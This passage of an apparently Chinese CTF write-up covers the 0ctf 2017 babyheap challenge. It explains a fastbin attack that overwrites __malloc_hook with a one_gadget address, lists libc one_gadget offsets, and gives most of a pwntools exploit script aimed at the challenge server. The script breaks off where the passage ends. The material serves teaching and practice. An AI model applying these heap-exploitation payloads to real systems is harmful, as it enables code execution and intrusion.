&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/14/pPRXwTK.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;main_arena-0x40+0xd&lt;/code&gt;  的地方找到该地址，由于有保护，所以要用 &lt;code&gt;libc_base+偏移&lt;/code&gt; 来到达该地址&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;fake_chunk=main_arena-0x40+0xd (mian_arena-0x33)
libc_base=main_arena+0x58-0x3c4b78
(main_arena-0x3c4b78=libc_base-0x58)	

fake_chunk=libc_base-0x58+0x3c4b78-0x40+0xd= libc_base+3c4aed 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;所以 &lt;code&gt;fake_chunk= libc_base+0x3c4aed&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;6. 将 fake_chunk 地址写入 fastbin 中，便于后续溢出来 getshell&lt;/p&gt;
&lt;p&gt;由于此时 chunk4 仍然在 unsorted bin 中（index4 被释放），而 index2 仍然指向 chunk4，可以用 index2 来改写 fd，所以要使 chunk4 进入 fastbin 中&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;allocate(0x60) //回收一部分chunk4
free(4)  //使chunk4进入fastbin中

payload4=p64(fake_chunk)  //改写chunk4的fd使fake_chunk进入fastbin
fill(2,length(payload4),payload4)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;7. 回收 chunk4 与 fake_chunk 来 getshell (  &lt;code&gt;malloc_hook=main_arena-0x10&lt;/code&gt;  )&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;allocate(0x60)  //index4，分配chunk4
allocate(0x60)  //index5，分配fake_chunk

//因为 malloc_hook=main_arena-0x10，fake_chunk=mian_arena-0x33
//所以 malloc_hook=fake_chunk+0x23(fake_chunk+0x33-0x10)

payload5=p64(0)+p64(0)+p8(0)*3 //0x13
payload5+=p64(libc_base+0x4526a) //0x4526a由one_gadget查找得到
fill(5，length(payload5),payload5)

allocate(0x60) //执行一次就会执行malloc_hook，就可以getshell
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过别人的 wp 发现 one_gadget 找出来的地址不对的原因：&lt;br /&gt;
&lt;strong&gt;值得注意的是，&lt;br /&gt;
这道题在于 2017 年的 0ctf 上的赛题，在当时使用 libc2.23-0ubuntu11.2 版本的共享库，但时至今日，Ubuntu16 已经不再使用该版本，而是 libc2.23-0ubuntu11.3 版本共享库，而 buu 上也使用前者版本，只能通过一些以前的 wp 来获取当时版本的 one_gadget，这里记一下比较常用的&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;og1=[0x45216,0x4526a,0xf02a4,0xf1147]    #libc2.23-0ubuntu11.2
og2=[0x45226,0x4527a,0xf0364,0xf1207]    #libc2.23-0ubuntu11.3
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b2thbWVpbmUudG9wLzIwMjEvMDgvMDkvYmFieWhlYXBfMGN0Zl8yMDE3Lw==&#34;&gt;https://tokameine.top/2021/08/09/babyheap_0ctf_2017/&lt;/span&gt;&lt;br /&gt;
exp:&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;span&gt;n&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; LibcSearcher &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;context&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;log_level &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;debug&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;remote&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;node4.buuoj.cn&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;25727&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#e=ELF(&#34;./babyheap_0ctf_2017&#34;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#write_plt=e.plt[&#34;write&#34;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#read_plt=e.plt[&#34;read&#34;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;allocate&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;size&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Command: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;1&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Size: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;size&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#此处必须转成 str（）类型，下面同理&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;fill&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;size&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;content&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Command: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;2&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Index: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Size: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;size&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Content: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;content&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Command: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;3&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Index: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Command: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;4&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Index: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#步骤 1（对应上面的讲解步骤）&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x80&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#步骤 2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;free&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;free&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x21&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x21&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p8&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x80&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fill&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload2&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x21&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fill&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#步骤 3&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload3&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x91&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fill&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload3&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload3&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x80&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;free&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#步骤 4&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;55&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;56&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;main_arena_88&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;u64&lt;span class=&#34;token 